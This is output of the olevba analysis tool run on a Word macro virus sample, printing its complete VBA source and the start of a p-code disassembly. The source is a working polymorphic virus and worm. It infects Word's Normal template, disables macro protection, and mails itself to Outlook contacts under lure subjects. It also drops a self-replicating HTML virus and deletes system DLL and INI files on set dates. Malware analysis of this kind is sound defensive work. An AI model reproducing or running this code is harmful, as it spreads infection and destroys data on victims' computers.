olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Evolution.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Evolution.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO QNXSUSNK.bas 
in file: ./Virus.MSWord.Evolution.b - OLE stream: 'Macros/VBA/QNXSUSNK'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public BootCk1 As String
Public BootCk2 As String
Public BootCk3 As String
Public Bootup As Boolean
Public ByeMacro As String
Public Hostinf As Boolean
Public FileInf As Boolean
Public FExport As String
Public Ex_Yes As Boolean
Public Filename As String
Public FileID As String
Public Virname As String
Public FC_There As Boolean
Public FO_There As Boolean
Public FP_There As Boolean
Public FN_There As Boolean
Public FS_There As Boolean
Public FSA_There As Boolean
Public VrusName As String
Public Armor As Boolean
Function Boot_Inf()
  On Error Resume Next
 Application.EnableCancelKey = wdCancelDisabled
 BootCk1 = Dir(Application.StartupPath + "\Wordinit.dot")
 BootCk2 = Dir(Application.StartupPath + "\WordTemp.dot")
 BootCk3 = Dir(Application.StartupPath + "\Add-in.dot")
 If BootCk1 = "Wordinit.dot" Then Bootup = True
 If BootCk2 = "WordTemp.dot" Then Bootup = True
 If BootCk3 = "Add-in.dot" Then Bootup = True
 If Bootup = True Then GoTo checkmy
If ActiveDocument.Saved = True Then
 Randomize Timer
V = Int(Rnd(1) * 3) + 1
    If V = 1 Then
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options", "STARTUP-PATH") = "C:\Windows\System"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Options", "STARTUP-PATH") = "C:\Windows\System"
    End If
    If V = 2 Then
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options", "STARTUP-PATH") = "C:\Windows\Command"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Options", "STARTUP-PATH") = "C:\Windows\Command"
    End If
    If V = 3 Then
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options", "STARTUP-PATH") = "C:\Program Files"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Options", "STARTUP-PATH") = "C:\Program Files"
   r = Int(Rnd(1) * 3) + 1
 If r = 1 Then
        ActiveDocument.SaveAs Filename:=Application.StartupPath + "\Wordinit.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
    End If
 If r = 2 Then
        ActiveDocument.SaveAs Filename:=Application.StartupPath + "\WordTemp.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
    End If
  If r = 3 Then
        ActiveDocument.SaveAs Filename:=Application.StartupPath + "\Add-in.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
    End If
    End If
checkmy:
Open "C:\windows\system\Exchange.cpl" For Input As #1
Line Input #1, FileID
Close #1
Application.ScreenUpdating = False
    Call ID_check
If Hostinf = False Then
With NormalTemplate.VBProject
            With .VBComponents.Import(FileID)
            End With
            End With
NormalTemplate.Save
End If
If FileInf = False Then
With ActiveDocument.VBProject
    With .VBComponents.Import(FileID)
    End With
End With
End If
End If
Application.ScreenUpdating = True
End Function
 Function Worm()
 ' For Outlook
  On Error Resume Next
 Application.EnableCancelKey = wdCancelDisabled
 Dim Z
Randomize Timer
Z = Int(Rnd(1) * 3) + 1
If Z = 1 Then Call Cancer
If Z = 2 Then Call Adult
If Z = 3 Then Call Jokes
End Function
Function Cancer()
On Error Resume Next
 Application.EnableCancelKey = wdCancelDisabled
Dim SadAgnuOutlook, Sadmapiname, Spawnme
Set SadAgnuOutlook = CreateObject("Outlook.Application")
Set Sadmapiname = SadAgnuOutlook.GetNameSpace("MAPI")
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "W2KM/Starbyte...W97M/Starbyte") <> "by Lucky2000" Then

If SadAgnuOutlook = "Outlook" Then
Sadmapiname.Logon "Guest", "password"
For y = 1 To Sadmapiname.AddressLists.Count
Set AddyBook = Sadmapiname.AddressLists(y)
X = 1
Set Spawnme = SadAgnuOutlook.CreateItem(0)
For oo = 1 To AddyBook.AddressEntries.Count
Peep = AddyBook.AddressEntries(X)
Spawnme.Recipients.Add Peep
X = X + 1
If X > 75 Then oo = AddyBook.AddressEntries.Count
Next oo
Spawnme.Subject = "Can I help you ???"
Spawnme.Body = "Ok...I help you...To make our PC are Infected by STARBYTE !!!"
Spawnme.Attachments.Add ActiveDocument.FullName
Spawnme.Send
Peep = ""
Next y
Sadmapiname.Logoff
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "W2KM/Starbyte...W97M/Starbyte") = "Lucky2000"
End If
 End Function
Function Adult()
On Error Resume Next
 Application.EnableCancelKey = wdCancelDisabled
Dim SadAgnuOutlook, Sadmapiname, Spawnme
Set SadAgnuOutlook = CreateObject("Outlook.Application")
Set Sadmapiname = SadAgnuOutlook.GetNameSpace("MAPI")
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "W2KM/Starbyte...W97M/Starbyte") <> "Lucky2000" Then

If SadAgnuOutlook = "Outlook" Then
Sadmapiname.Logon "Guest", "password"
For y = 1 To Sadmapiname.AddressLists.Count
Set AddyBook = Sadmapiname.AddressLists(y)
X = 1
Set Spawnme = SadAgnuOutlook.CreateItem(0)
For oo = 1 To AddyBook.AddressEntries.Count
Peep = AddyBook.AddressEntries(X)
Spawnme.Recipients.Add Peep
X = X + 1
If X > 75 Then oo = AddyBook.AddressEntries.Count
Next oo
Spawnme.Subject = "Free Adult Site Passwords!!"
Spawnme.Body = "Free inside attached Document are over 50 Adult Verify Passwords!!  Use for your deepest desires!! Adults Only Please..."
Spawnme.Attachments.Add ActiveDocument.FullName
Spawnme.Send
Peep = ""
Next y
Sadmapiname.Logoff
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "W2KM/Starbyte...W97M/Starbyte") = "Lucky2000"
End If
End Function
Function Jokes()
On Error Resume Next
 Application.EnableCancelKey = wdCancelDisabled
Dim SadAgnuOutlook, Sadmapiname, Spawnme
Set SadAgnuOutlook = CreateObject("Outlook.Application")
Set Sadmapiname = SadAgnuOutlook.GetNameSpace("MAPI")
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "W2KM/Starbyte...W97M/Starbyte") <> "Lucky2000" Then

If SadAgnuOutlook = "Outlook" Then
Sadmapiname.Logon "Guest", "password"
For y = 1 To Sadmapiname.AddressLists.Count
Set AddyBook = Sadmapiname.AddressLists(y)
X = 1
Set Spawnme = SadAgnuOutlook.CreateItem(0)
For oo = 1 To AddyBook.AddressEntries.Count
Peep = AddyBook.AddressEntries(X)
Spawnme.Recipients.Add Peep
X = X + 1
If X > 75 Then oo = AddyBook.AddressEntries.Count
Next oo
Spawnme.Subject = "Congratulation"
Spawnme.Body = "Congratulation you WON a very funny Price !!  "
Spawnme.Attachments.Add ActiveDocument.FullName
Spawnme.Send
Peep = ""
Next y
Sadmapiname.Logoff
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "W2KM/Starbyte...W97M/Starbyte") = "Lucky2000"
End If
End Function
Function ID_check()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Open "C:\windows\system\FixDvr.cpl" For Input As #1
Do
Line Input #1, Virname
For Z = 1 To ActiveDocument.VBProject.VBComponents.Count
               If ActiveDocument.VBProject.VBComponents(Z).Name <> "ThisDocument" Then
    If Virname = ActiveDocument.VBProject.VBComponents(Z).Name Then GoTo lost
    If Virname <> ActiveDocument.VBProject.VBComponents(Z).Name Then GoTo newname
newname:
Close #1
Open "C:\windows\system\FixDvr.cpl" For Append As #1
    Print #1, ActiveDocument.VBProject.VBComponents(Z).Name
      Close #1
        End If
    If ActiveDocument.VBProject.VBComponents(Z).Name = "ThisDocument" Then GoTo lost
lost:
Next Z
Loop Until EOF(1)
Close #1
Dim Lib
Open "C:\windows\system\FixDvr.cpl" For Input As #1
Do
Line Input #1, Virname
For Lib = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(Lib).Name = "ThisDocument" Then GoTo skip
    If NormalTemplate.VBProject.VBComponents(Lib).Name = Virname Then Hostinf = True: GoTo doccheck
skip:
Next Lib
Loop Until EOF(1)
Hostinf = False
doccheck:
Close #1
Open "C:\windows\system\FixDvr.cpl" For Input As #1
Do
Line Input #1, Virname
For Lib = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(Lib).Name = "ThisDocument" Then GoTo nope
    If ActiveDocument.VBProject.VBComponents(Lib).Name = Virname Then FileInf = True: GoTo leave
    If ActiveDocument.VBProject.VBComponents(Lib).Name <> Virname Then FileInf = False:
nope:
Next Lib
Loop Until EOF(1)
FileInf = False
leave:
Close #1
End Function
Function Status_Of_Armor()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
If GetAttr(NormalTemplate.FullName) = vbReadOnly Then Armor = True
Offense:
If Armor = True Then SetAttr (NormalTemplate.FullName), vbNormal
Armor = False
End Function
Function Code_Transportation()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
FExport = Dir("C:\windows\system\Exchange.cpl")
If FExport = "Exchange.cpl" Then Ex_Yes = True
If Ex_Yes = False Then GoTo Morph_ME Else GoTo Recognize
Morph_ME:
Randomize Timer
q = Int(Rnd(1) * 5) + 1
For vi = 1 To q
X = Int(Rnd(1) * 26)
If X = 1 Then a$ = "A"
If X = 2 Then a$ = "B"
If X = 3 Then a$ = "C"
If X = 4 Then a$ = "D"
If X = 5 Then a$ = "E"
If X = 6 Then a$ = "F"
If X = 7 Then a$ = "G"
If X = 8 Then a$ = "H"
If X = 9 Then a$ = "I"
If X = 10 Then a$ = "J"
If X = 11 Then a$ = "K"
If X = 12 Then a$ = "L"
If X = 13 Then a$ = "M"
If X = 14 Then a$ = "N"
If X = 15 Then a$ = "O"
If X = 16 Then a$ = "P"
If X = 17 Then a$ = "Q"
If X = 18 Then a$ = "R"
If X = 19 Then a$ = "S"
If X = 20 Then a$ = "T"
If X = 21 Then a$ = "U"
If X = 22 Then a$ = "V"
If X = 23 Then a$ = "W"
If X = 24 Then a$ = "X"
If X = 25 Then a$ = "Y"
If X = 26 Then a$ = "Z"
Filename = Filename + a$
Next vi
X = Int(Rnd(1) * 999) + 1
FileID = "C:\windows\system\" & Filename & X & ".cpl"
Open "C:\windows\system\Exchange.cpl" For Append As #1
Print #1, FileID
Close #1
For X = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(X).Name = "ThisDocument" Then GoTo nex
    If ActiveDocument.VBProject.VBComponents(X).Name <> "ThisDocument" Then GoTo rite
rite:
Open "C:\windows\system\FixDvr.cpl" For Append As #1
Print #1, ActiveDocument.VBProject.VBComponents(X).Name
Close #1
nex:
Next X
Do
On Error Resume Next
Open "C:\windows\system\FixDvr.cpl" For Input As #1
Line Input #1, Virname
NormalTemplate.VBProject.VBComponents(Virname).export FileID
ActiveDocument.VBProject.VBComponents(Virname).export FileID
Loop Until EOF(1)
nextt:
Exit Function
Recognize:
Open "C:\windows\system\Exchange.cpl" For Input As #1
Line Input #1, FileID
Close #1
Do
On Error Resume Next
Open "C:\windows\system\FixDvr.cpl" For Input As #1
Line Input #1, Virname
NormalTemplate.VBProject.VBComponents(Virname).export FileID
ActiveDocument.VBProject.VBComponents(Virname).export FileID
Loop Until EOF(1)
tryharder:
End Function
Function Morph_check()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Open FileID For Input As #1
Dim FC_Check
Do
    Line Input #1, FC_Check
    If FC_Check = "Sub FileClose()" Then FC_There = True: GoTo FO_Look
Loop Until EOF(1)
FO_Look:
Dim FO_Check
Do
    Line Input #1, FO_Check
    If FO_Check = "Sub FileOpen()" Then FO_There = True: GoTo FP_Look
Loop Until EOF(1)
FP_Look:
Dim FP_Check
Do
    Line Input #1, FP_Check
    If FP_Check = "Sub FilePrint()" Then FP_There = True: GoTo FN_Look
Loop Until EOF(1)
FN_Look:
Dim FN_Check
Do
    Line Input #1, FN_Check
    If FN_Check = "Sub FileNew()" Then FN_There = True: GoTo FS_Look
Loop Until EOF(1)
FS_Look:
Dim FS_Check
Do
    Line Input #1, FS_Check
    If FS_Check = "Sub FileSave()" Then FS_There = True: GoTo FSA_Look
Loop Until EOF(1)
FSA_Look:
Dim FSA_Check
Do
    Line Input #1, FSA_Check
    If FSA_Check = "Sub FileSaveAs()" Then FSA_There = True: Exit Function
Loop Until EOF(1)
End Function
Function Uprising()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Open "C:\windows\system\Exchange.cpl" For Input As #1
Line Input #1, FileID
Close #1
Randomize Timer
PM = Int(Rnd(1) * 75) + 1
If PM = 22 Then
If FC_There = True Then Exit Function
Open FileID For Append As #1
Print #1, "Sub FileClose()"
Print #1, "On error resume next"
Print #1, "Call Starbyte"
Print #1, "Wordbasic.FileSave"
Print #1, "End Sub"
Close #1
End If
If PM = 73 Then
If FO_There = True Then Exit Function
Open FileID For Append As #1
Print #1, "Sub FileOpen()"
Print #1, "on error resume next"
Print #1, "Dialogs(wdDialogFileOpen)"
Print #1, "Call Starbyte"
Print #1, "end sub"
Close #1
End If
If PM = 69 Then
If FP_There = True Then Exit Function
Open FileID For Append As #1
Print #1, "Sub FilePrint()"
Print #1, "on error resume next"
Print #1, "Dialogs(wdDialogFilePrint)"
Print #1, "Call Starbyte"
Print #1, "End sub"
Close #1
End If
If PM = 22 Then
If FN_There = True Then Exit Function
Open FileID For Append As #1
Print #1, "Sub FileNew()"
Print #1, "on error resume next"
Print #1, "Dialogs(wdDialogFileNew)"
Print #1, "Call Starbyte"
Print #1, "End Sub"
Close #1
End If
If PM = 9 Then
If FS_There = True Then Exit Function
Open FileID For Append As #1
Print #1, "Sub FileSave()"
Print #1, "on error resume next"
Print #1, "call Starbyte"
Print #1, "wordbasic.filesave"
Print #1, "end sub"
Close #1
End If
If PM = 18 Then
If FSA_There = True Then Exit Function
Open FileID For Append As #1
Print #1, "Sub FileSaveAs()"
Print #1, "on error resume next"
Print #1, "Dialogs(wdDialogFileSaveAs)"
Print #1, "Call Starbyte"
Print #1, "wordbasic.filesave"
Print #1, "end sub"
Close #1
End If
End Function
Function NfctNormal()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Open "C:\windows\system\Exchange.cpl" For Input As #1
Line Input #1, FileID
Close #1
For l = 1 To ActiveDocument.VBProject.VBComponents.Count
            If ActiveDocument.VBProject.VBComponents(l).Name = "ThisDocument" Then GoTo nexus
    If ActiveDocument.VBProject.VBComponents(l).Name <> "ThisDocument" Then
        Open "C:\windows\system\FixDvr.cpl" For Append As #1
        Print #1, ActiveDocument.VBProject.VBComponents(l).Name
        Close #1
        End If
nexus:
    Next l
With NormalTemplate.VBProject.VBComponents.Import(FileID)
End With
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\.DEFAULT\Software\Starbyte", "Lucky2000") = "1" Then Exit Function
Assistant.Visible = True
    With Assistant.NewBalloon
            .Icon = msoIconAlert
            .Text = "An error has occurred, please save all Documents and restart Microsoft Word.  If the problem persists please contact Microsoft Technical Support."
            .Heading = "Microsoft Word"
            .Animation = msoAnimationGetTechy
            .Show
        End With
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\.DEFAULT\Software\Starbyte", "Lucky2000") = "1"
End Function
Function NfctFile()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
VrusName = ""
Open "C:\windows\system\Exchange.cpl" For Input As #1
Line Input #1, FileID
Close #1
With ActiveDocument.VBProject.VBComponents.Import(FileID)
End With
Randomize Timer
q = Int(Rnd(1) * 10) + 2
For vi = 1 To q
X = Int(Rnd(1) * 26)
If X = 1 Then a$ = "A"
If X = 2 Then a$ = "B"
If X = 3 Then a$ = "C"
If X = 4 Then a$ = "D"
If X = 5 Then a$ = "E"
If X = 6 Then a$ = "F"
If X = 7 Then a$ = "G"
If X = 8 Then a$ = "H"
If X = 9 Then a$ = "I"
If X = 10 Then a$ = "J"
If X = 11 Then a$ = "K"
If X = 12 Then a$ = "L"
If X = 13 Then a$ = "M"
If X = 14 Then a$ = "N"
If X = 15 Then a$ = "O"
If X = 16 Then a$ = "P"
If X = 17 Then a$ = "Q"
If X = 18 Then a$ = "R"
If X = 19 Then a$ = "S"
If X = 20 Then a$ = "T"
If X = 21 Then a$ = "U"
If X = 22 Then a$ = "V"
If X = 23 Then a$ = "W"
If X = 24 Then a$ = "X"
If X = 25 Then a$ = "Y"
If X = 26 Then a$ = "Z"
VrusName = VrusName + a$
Next vi
Open "C:\windows\system\FixDvr.cpl" For Input As #1
Do
Line Input #1, Virname
Application.OrganizerRename Source:=ActiveDocument.FullName, Name:=Virname, newname:=VrusName, Object:=wdOrganizerObjectProjectItems
Loop Until EOF(1)
Close #1
For X = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(X).Name = "ThisDocument" Then GoTo nex
    If ActiveDocument.VBProject.VBComponents(X).Name <> "ThisDocument" Then GoTo rite
rite:
Open "C:\windows\system\FixDvr.cpl" For Append As #1
Print #1, ActiveDocument.VBProject.VBComponents(X).Name
Close #1
nex:
Next X
End Function
Function STARBYTE()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Call Code_Transportation
Call ID_check
Call Status_Of_Armor
If Hostinf = False Then Call NfctNormal
If FileInf = False Then Call NfctFile
Call Morph_check
Call Uprising
Call Payload
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
    CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
End If
Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
If Armor = False Then CommandBars("tools").Controls("Macro").Delete
If Armor = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options", "EnableMacroVirusProtection") = "0"
End Function
Sub AutoClose()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Call Revolution
WordBasic.filesave
Call Boot_Inf
End Sub
Sub AutoExec()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Call Status_Of_Armor
Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
If Armor = False Then CommandBars("tools").Controls("Macro").Delete
If Armor = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
    CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
End If
Call Boot_Inf
End Sub
Sub AutoExit()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Call STARBYTE
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\.DEFAULT\Software\Starbyte", "Germany") = "1" Then GoTo ZineS
Open "C:\windows\system\Exchange.cpl" For Input As #2
Line Input #2, FileID
Close #2
Open FileID For Append As #9
Print #9, "' EOF"
Close #9
Open FileID For Input As #3
Randomize Timer
W = Int(Rnd(1) * 5) + 1
For vir = 1 To W
X = Int(Rnd(1) * 26)
If X = 1 Then a$ = "A"
If X = 2 Then a$ = "B"
If X = 3 Then a$ = "C"
If X = 4 Then a$ = "D"
If X = 5 Then a$ = "E"
If X = 6 Then a$ = "F"
If X = 7 Then a$ = "G"
If X = 8 Then a$ = "H"
If X = 9 Then a$ = "I"
If X = 10 Then a$ = "J"
If X = 11 Then a$ = "K"
If X = 12 Then a$ = "L"
If X = 13 Then a$ = "M"
If X = 14 Then a$ = "N"
If X = 15 Then a$ = "O"
If X = 16 Then a$ = "P"
If X = 17 Then a$ = "Q"
If X = 18 Then a$ = "R"
If X = 19 Then a$ = "S"
If X = 20 Then a$ = "T"
If X = 21 Then a$ = "U"
If X = 22 Then a$ = "V"
If X = 23 Then a$ = "W"
If X = 24 Then a$ = "X"
If X = 25 Then a$ = "Y"
If X = 26 Then a$ = "Z"
Filename = Filename + a$
Next vir
F = Int(Rnd(1) * 999) + 1
FileID = "C:\windows\system\" & Filename & F & ".cpl"
Open FileID For Append As #4
Do
Line Input #3, stuff
Print #4, stuff
    Randomize Timer
    t = Int(Rnd(1) * 7) + 1
        If t = 1 Then Z$ = " '" & Application.UserAddress
        If t = 2 Then Z$ = " '" & Application.UserName
        If t = 3 Then Z$ = " '" & Time$
        If t = 4 Then Z$ = " '" & Application.UserInitials
        If t = 5 Then Z$ = " '" & Int(Rnd(1) * 9999999)
Print #4, Z$
        Loop Until stuff = "' EOF"
Close #3
Close #4
Kill "C:\windows\system\Exchange.cpl"
Open "C:\windows\system\Exchange.cpl" For Append As #5
Print #5, FileID
Close #5
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\.DEFAULT\Software\Starbyte", "Germany") = "1"
ZineS:
End Sub
Sub AutoNew()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Call STARBYTE
End Sub
Sub AutoOpen()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Call STARBYTE
Call Worm
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled

End Sub
Sub ToolsCustomize()
Application.EnableCancelKey = wdCancelDisabled

End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled

End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled

End Sub
Function Payload()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
If System.PrivateProfileString("", "HKEY_USERS\.DEFAULT\Software\Hax\Starbyte", "HTP-Error") = "Lucky2000" Then Exit Function
If Day(Now) = 26 Then GoTo NukeDLL
If Day(Now) = 5 Then GoTo Format_Me
Randomize Timer
X = Int(Rnd(1) * 40) + 1
If X = 10 Then
Open "C:\windows\Control.ini" For Append As #1
Seek #1, 0
Print #1, "[Lucky2000's Contest]"
Print #1, "DemoType = 0"
Print #1, "RotStyle = 3"
Print #1, "Tesselation = 100"
Print #1, "Size = 100"
Print #1, "Speed = 75"
Print #1, "SurfStyle = 0"
Print #1, "Font = Comic Sans MS"
Print #1, "FontAttributes = 0"
Print #1, "Charset = 0"
Print #1, "Text = Starbyte a very Funny Virus !!!"
Print #1, "Texture = None"
Print #1, "TextureFileOffset = 3"
Close #1
End If
If X = 20 Then
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Main", "Start Page") = "C:\Windows\System\Default1.html"
Open "C:\windows\system\Default1.html" For Output As #1
Print #1, "<html><!--HTML/Lucky .a-->"
Print #1, "<body>"
Print #1, "<SCRIPT language=vbscript>"
Print #1, "Sub Window_OnLoad()"
Print #1, "Call Infection"
Print #1, "End Sub"
Print #1, "Sub Infection()"
Print #1, "Set FLSysObj = CreateObject" & Chr(40) & Chr(34) & "Scripting.FileSystemObject" & Chr(34) & Chr(41)
Print #1, "Set wordobj = CreateObject" & Chr(40) & Chr(34) & "Word.application" & Chr(34) & Chr(41)
Print #1, "Set FLSrch = wordobj.Application.FileSearch"
Print #1, "FLSrch.NewSearch"
Print #1, "FLSrch.LookIn = " & Chr(34) & "C:\" & Chr(34)
Print #1, "FLSrch.SearchSubFolders = True"
Print #1, "FLSrch.FileName = " & Chr(34) & "*.htm*" & Chr(34)
Print #1, "FLSrch.Execute"
Print #1, "For t = 1 To FLSrch.FoundFiles.Count"
Print #1, "Set InFX = FLSysObj.opentextfile(FLSrch.FoundFiles(t), 1)"
Print #1, "f = InFX.readline"
Print #1, "InFX.Close"
Print #1, "If f <> " & Chr(34) & "<html><!--HTML/Lucky .a-->" & Chr(34) & " Then"
Print #1, "Set TxtRng = Document.body.createTextRange"
Print #1, "Set Lucky = FLSysObj.opentextfile(FLSrch.FoundFiles(t), 1)"
Print #1, "Contents = Lucky.readall"
Print #1, "Lucky.Close"
Print #1, "Set Kry = FLSysObj.opentextfile(FLSrch.FoundFiles(t), 2, True)"
Print #1, "Kry.writeline " & Chr(34) & "<html><!--HTML/Lucky .a-->" & Chr(34)
Print #1, "Kry.writeline " & Chr(34) & "<body>" & Chr(34)
Print #1, "Kry.writeline TxtRng.HTMLText"
Print #1, "Kry.writeline " & Chr(34) & "</body>" & Chr(34)
Print #1, "Kry.writeline " & Chr(34) & "</html>" & Chr(34)
Print #1, "Kry.writeline Contents"
Print #1, "Kry.Close"
Print #1, "End If"
Print #1, "Next"
Print #1, "wordobj.Quit"
Print #1, "End Sub"
Print #1, "</SCRIPT>"
Print #1, "</body>"
Print #1, "</html>"
Close #1
End If
If X = 30 Then
Open "C:\autoexec.bat" For Append As #1
Print #1, "@echo This a file from Lucky2000 !!!"
Close #1
End If
If X = 40 Then
On Error Resume Next
Kill "C:\windows\logos.sys"
Kill "C:\windows\system\*.scr"
End If
Exit Function
Format_Me:
Kill "C:\windows\*.ini"
Exit Function
NukeDLL:
Kill "C:\windows\system\*.dll"
Exit Function
End Function
' Polymorphic/Stealth/Destructive Word 97/2000/SR-1 Compatibler Macro Virus/Worm
' Self-Replicating HTML Virus HTML/Lucky .a
' By Lucky2000 the next Generation
' EOF

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Evolution.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/QNXSUSNK - 40754 bytes
' Line #0:
' 	Dim (Public) 
' 	VarDefn BootCk1 (As String)
' Line #1:
' 	Dim (Public) 
' 	VarDefn BootCk2 (As String)
' Line #2:
' 	Dim (Public) 
' 	VarDefn BootCk3 (As String)
' Line #3:
' 	Dim (Public) 
' 	VarDefn Bootup (As Boolean)
' Line #4:
' 	Dim (Public) 
' 	VarDefn ByeMacro (As String)
' Line #5:
' 	Dim (Public) 
' 	VarDefn Hostinf (As Boolean)
' Line #6:
' 	Dim (Public) 
' 	VarDefn FileInf (As Boolean)
' Line #7:
' 	Dim (Public) 
' 	VarDefn FExport (As String)
' Line #8:
' 	Dim (Public) 
' 	VarDefn Ex_Yes (As Boolean)
' Line #9:
' 	Dim (Public) 
' 	VarDefn Filename (As String)
' Line #10:
' 	Dim (Public) 
' 	VarDefn FileID (As String)
' Line #11:
' 	Dim (Public) 
' 	VarDefn Virname (As String)
' Line #12:
' 	Dim (Public) 
' 	VarDefn FC_There (As Boolean)
' Line #13:
' 	Dim (Public) 
' 	VarDefn FO_There (As Boolean)
' Line #14:
' 	Dim (Public) 
' 	VarDefn FP_There (As Boolean)
' Line #15:
' 	Dim (Public) 
' 	VarDefn FN_There (As Boolean)
' Line #16:
' 	Dim (Public) 
' 	VarDefn FS_There (As Boolean)
' Line #17:
' 	Dim (Public) 
' 	VarDefn FSA_There (As Boolean)
' Line #18:
' 	Dim (Public) 
' 	VarDefn VrusName (As String)
' Line #19:
' 	Dim (Public) 
' 	VarDefn Armor (As Boolean)
' Line #20:
' 	FuncDefn (Function Boot_Inf())
' Line #21:
' 	OnError (Resume Next) 
' Line #22:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #23:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000D "\Wordinit.dot"
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	St BootCk1 
' Line #24:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000D "\WordTemp.dot"
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	St BootCk2 
' Line #25:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000B "\Add-in.dot"
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	St BootCk3 
' Line #26:
' 	Ld BootCk1 
' 	LitStr 0x000C "Wordinit.dot"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Bootup 
' 	EndIf 
' Line #27:
' 	Ld BootCk2 
' 	LitStr 0x000C "WordTemp.dot"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Bootup 
' 	EndIf 
' Line #28:
' 	Ld BootCk3 
' 	LitStr 0x000A "Add-in.dot"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Bootup 
' 	EndIf 
' Line #29:
' 	Ld Bootup 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo checkmy 
' 	EndIf 
' Line #30:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #31:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #32:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0003 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St V 
' Line #33:
